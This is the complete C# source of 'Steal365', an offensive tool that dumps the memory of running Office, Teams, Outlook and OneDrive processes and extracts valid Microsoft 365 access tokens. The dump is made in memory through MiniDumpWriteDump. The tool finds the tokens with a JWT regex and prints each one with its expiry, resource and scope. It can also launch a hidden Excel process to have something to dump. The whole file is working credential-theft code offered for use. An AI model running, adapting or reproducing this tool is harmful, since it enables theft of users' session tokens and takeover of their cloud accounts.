using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace Steal365
{
    public class Program
    {
        static byte[] SafetyDump(string pName)
        {
            // https://github.com/riskydissonance/SafetyDump

            uint targetProcessId;
            IntPtr targetProcessHandle;

            try
            {
                Process proc = Process.GetProcessesByName(pName)[0];
                targetProcessId = (uint)proc.Id;
                targetProcessHandle = proc.Handle;
            }
            catch
            {
                Console.WriteLine($"    - {pName} not found!");
                return null;
            }

            try
            {
                var byteArray = new byte[60 * 1024 * 1024];
                var callbackPtr = new MinidumpCallbackRoutine((param, input, output) =>
                {
                    var inputStruct = Marshal.PtrToStructure<MINIDUMP_CALLBACK_INPUT>(input);
                    var outputStruct = Marshal.PtrToStructure<MINIDUMP_CALLBACK_OUTPUT>(output);
                    switch (inputStruct.CallbackType)
                    {
                        case MINIDUMP_CALLBACK_TYPE.IoStartCallback:
                            outputStruct.status = HRESULT.S_FALSE;
                            Marshal.StructureToPtr(outputStruct, output, true);
                            return true;
                        case MINIDUMP_CALLBACK_TYPE.IoWriteAllCallback:
                            var ioStruct = inputStruct.Io;
                            if ((int)ioStruct.Offset + ioStruct.BufferBytes >= byteArray.Length)
                            {
                                Array.Resize(ref byteArray, byteArray.Length * 2);
                            }
                            Marshal.Copy(ioStruct.Buffer, byteArray, (int)ioStruct.Offset, ioStruct.BufferBytes);
                            outputStruct.status = HRESULT.S_OK;
                            Marshal.StructureToPtr(outputStruct, output, true);
                            return true;
                        case MINIDUMP_CALLBACK_TYPE.IoFinishCallback:
                            outputStruct.status = HRESULT.S_OK;
                            Marshal.StructureToPtr(outputStruct, output, true);
                            return true;
                        default:
                            return true;
                    }
                });

                var callbackInfo = new MINIDUMP_CALLBACK_INFORMATION
                {
                    CallbackRoutine = callbackPtr,
                    CallbackParam = IntPtr.Zero
                };

                var size = Marshal.SizeOf(callbackInfo);
                var callbackInfoPtr = Marshal.AllocHGlobal(size);
                Marshal.StructureToPtr(callbackInfo, callbackInfoPtr, false);

                if (MiniDumpWriteDump(targetProcessHandle, targetProcessId, IntPtr.Zero, (uint)2, IntPtr.Zero, IntPtr.Zero, callbackInfoPtr))
                {
                    return byteArray;

                }
                Console.WriteLine("  - dump failed");
                Console.WriteLine(Marshal.GetLastWin32Error());
                return null;
            }
            catch (Exception e)
            {
                Console.WriteLine("  - exception dumping process memory");
                Console.WriteLine($"\n  - {e.Message}\n{e.StackTrace}");
                return null;
            }
        }

        static List<string> GetTokens(byte[] dump)
        {
            try
            {
                string data = Encoding.UTF8.GetString(dump);
                var tokens = new List<string>();
                string pattern = @"\beyJ0eX[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\b";
                foreach (Match match in Regex.Matches(data, pattern))
                {
                    tokens.Add(match.ToString());
                }
                List<string> unique = new HashSet<string>(tokens).ToList();
                return unique;
            }
            catch
            {
                return new List<string>();
            }
        }

        static void CheckToken(List<string> tokens)
        {
            Console.WriteLine($"  \\-- dump ok");
            Console.WriteLine($"  \\-- looking for tokens...");

            foreach (var token in tokens)
            {
                
                var payload = token.Split('.')[1];

                while ((payload.Length % 4) != 0)
                {
                    payload += "=";
                }

                var json = Encoding.UTF8.GetString(Convert.FromBase64String(payload));

                var match = Regex.Match(json, @"""exp"":\s*""?(\d+)""?");

                if (!match.Success)
                {
                    Console.WriteLine("    + Token without exp");
                    Console.WriteLine($"    + Token: {token}\n");
                    continue;
                }

                long exp = long.Parse(match.Groups[1].Value);

                if (exp > DateTimeOffset.Now.ToUnixTimeSeconds())
                {
                    DateTimeOffset dateTimeOffset = DateTimeOffset.FromUnixTimeSeconds(exp);
                    DateTime dateTime = dateTimeOffset.LocalDateTime;

                    Console.WriteLine($"    + Valid token: {dateTime}");

                    match = Regex.Match(json, @"""aud"":\s*""([^""]+)""");
                    Console.WriteLine($"    + Resource: {match.Groups[1].Value}");

                    match = Regex.Match(json, @"""scp"":\s*""([^""]+)""");
                    Console.WriteLine($"    + Scope: {match.Groups[1].Value}");

                    Console.WriteLine($"    + Token: {token}\n");
                }
            }
        }

        static bool CheckWin11()
        {
            RTL_OSVERSIONINFOEX versionInfo = new RTL_OSVERSIONINFOEX();
            versionInfo.dwOSVersionInfoSize = Marshal.SizeOf(typeof(RTL_OSVERSIONINFOEX));

            int status = RtlGetVersion(ref versionInfo);
            if (status == 0) // STATUS_SUCCESS
            {
                // Windows 11: Major = 10, Build >= 22000
                return versionInfo.dwMajorVersion == 10 && versionInfo.dwBuildNumber >= 22000;
            }

            return false;
        }

        static void NewProcess()
        {
            try
            {
                string fullName = @"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE";
                string pName = "excel";
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = fullName,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                using (Process p = Process.Start(psi))
                {
                    Console.WriteLine("[+] process created");

                    Console.WriteLine($"[>] try dump: {pName}");
                    byte[] dump = SafetyDump(pName);

                    if (dump != null)
                    {
                        var tokens = GetTokens(dump);

                        if (tokens.Any())
                        {
                            CheckToken(tokens);
                        }
                        else
                        {
                            Console.WriteLine($"    - no tokens\n");
                        }
                    }

                    if (!p.HasExited)
                    {
                        p.Kill();
                        Console.WriteLine("[+] process killed");
                    }
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error: " + ex.Message);
            }
        }

        public static void Main(string[] args) 
        {
            Console.WriteLine("\n      --++[   Steal365   ]++--");

            var procs = new List<string> { "WINWORD", "onenoteim", "ONENOTE", "ms-teams", "POWERPNT", "OUTLOOK", "EXCEL", "OneDrive" };

            if (CheckWin11())
            {
                //Console.WriteLine("win11");
                procs.Add("Notepad");
                procs.Add("mspaint");
            }

            bool check = true;
            foreach (string p in procs)
            {
                Console.WriteLine($"\n[>] try dump: {p}");
                byte[] dump = SafetyDump(p);
                
                
                if (dump != null) 
                {
                    check = false;

                    var tokens = GetTokens(dump);

                    if (tokens.Any())
                    {
                        CheckToken(tokens);
                    }
                    else
                    {
                        Console.WriteLine($"    - no tokens\n");
                    }
                }
            }

            if (check)
            {
                Console.WriteLine("\n[+] no office process found");
                Console.WriteLine("[!] [NO OPSEC] do you want to create a process? (y/n)");
                string res = Console.ReadLine()?.ToLower();

                if (res == "y")
                {
                    NewProcess();
                }
                else
                {
                    Console.WriteLine("[-] done");
                }
                
            }
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int RtlGetVersion(ref RTL_OSVERSIONINFOEX lpVersionInformation);

        [StructLayout(LayoutKind.Sequential)]
        private struct RTL_OSVERSIONINFOEX
        {
            public int dwOSVersionInfoSize;
            public int dwMajorVersion;
            public int dwMinorVersion;
            public int dwBuildNumber;
            public int dwPlatformId;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
            public string szCSDVersion;
        }

        [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall,
             CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
        internal static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, IntPtr hFile, uint dumpType,
             IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct MINIDUMP_IO_CALLBACK
        {
            internal IntPtr Handle;
            internal ulong Offset;
            internal IntPtr Buffer;
            internal int BufferBytes;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct MINIDUMP_CALLBACK_INFORMATION
        {
            internal MinidumpCallbackRoutine CallbackRoutine;
            internal IntPtr CallbackParam;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct MINIDUMP_CALLBACK_INPUT
        {
            internal int ProcessId;
            internal IntPtr ProcessHandle;
            internal MINIDUMP_CALLBACK_TYPE CallbackType;
            internal MINIDUMP_IO_CALLBACK Io;
        }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        internal delegate bool MinidumpCallbackRoutine(IntPtr CallbackParam, IntPtr CallbackInput,
            IntPtr CallbackOutput);

        internal enum HRESULT : uint
        {
            S_FALSE = 0x0001,
            S_OK = 0x0000,
            E_INVALIDARG = 0x80070057,
            E_OUTOFMEMORY = 0x8007000E
        }

        internal struct MINIDUMP_CALLBACK_OUTPUT
        {
            internal HRESULT status;
        }

        internal enum MINIDUMP_CALLBACK_TYPE
        {
            ModuleCallback,
            ThreadCallback,
            ThreadExCallback,
            IncludeThreadCallback,
            IncludeModuleCallback,
            MemoryCallback,
            CancelCallback,
            WriteKernelMinidumpCallback,
            KernelMinidumpStatusCallback,
            RemoveMemoryCallback,
            IncludeVmRegionCallback,
            IoStartCallback,
            IoWriteAllCallback,
            IoFinishCallback,
            ReadMemoryFailureCallback,
            SecondaryFlagsCallback,
            IsProcessSnapshotCallback,
            VmStartCallback,
            VmQueryCallback,
            VmPreReadCallback,
            VmPostReadCallback
        }
    }
}
